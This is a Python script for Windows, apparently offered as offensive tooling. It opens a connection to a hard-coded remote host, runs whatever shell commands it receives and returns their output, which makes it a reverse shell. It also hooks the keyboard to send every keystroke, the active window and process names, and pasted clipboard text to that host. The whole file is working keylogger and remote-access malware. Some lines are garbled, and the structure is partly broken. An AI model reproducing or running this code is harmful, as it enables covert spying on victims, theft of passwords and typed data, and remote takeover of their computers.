#!/usr/bin/python
from ctypes import *
import socket, subprocess
import pyHook, pythoncom, sys, logging
import win32clipboard
from time import gmtime, strftime

HOST = '192.168.0.26'
PORT = 5151
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send('[*] Connection Established!')
s.send('\n[*] Listening for keystrokes <Press Return>')
s.send('\n')

while 1:
    data = s.recv(1024)
    if data == 'quit':break
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,
    stderr = subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_value = proc.stdout.read() + proc.stderr.read()
    s.send(stdout_value)

    user32   = windll.user32
    kernel32 = windll.kernel32
    psapi    = windll.psapi
    current_window = None
    
    def get_current_process():

        # get a handle to the foreground window
        hwnd = user32.GetForegroundWindow()

        # find the process ID
        pid = c_ulong(0)
        user32.GetWindowThreadProcessId(hwnd, byref(pid))

        # store the current process ID
        process_id = "%d" % pid.value

        # grab the executable
        executable = create_string_buffer("\x00" * 512)
        h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

        psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

        # now read it's title
        window_title = create_string_buffer("\x00" * 512)
        length = user32.GetWindowTextA(hwnd, byref(window_title),512)

        # print out the header if we're in the right process
        print
        # print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
        out = "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
        s.send(out)
        print

        # close handles
        kernel32.CloseHandle(hwnd)
        kernel32.CloseHandle(h_process)
        
    def KeyStroke(event):

        global current_window   
        phrase = ''
        # check to see if target changed windows
        if event.WindowName != current_window:
            current_window = event.WindowName        
            get_current_process()

        # if they pressed a standard key
        if event.Ascii > 32 and event.Ascii < 127:
            # convert data from ascii value to character
            v = chr(event.Ascii)
            s.send(v)

        else:
            # if [Ctrl-V], get the value on the clipboard
            # added by Dan Frisch 2014
            if event.Key == "V":
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboardnloeClipboard()
                print "[PASTE] - %s" % (pasted_value),

            # Excludes spaces, can remove if needed
            if event.Key != "Space":
                s.send("[%s]" % event.Key)

            # new line when enter key is pressed for readability
            if event.Key == "Return":
                s.send("\n[*] [" + strftime("%a, %d %b %Y %X", gmtime()) + "] ")

            # does not process the space command. Can remove later
            if event.Key == "Space":
                s.send(' ')
               
        # pass execution to next hook registered 
        return True

    # create and register a hook manager 
    kl         = pyHook.HookManager()
    kl.KeyDown = KeyStroke
    

    # register the hook and execute forever
    kl.HookKeyboard()
    pythoncom.PumpMessages()

s.close
sys.exit()
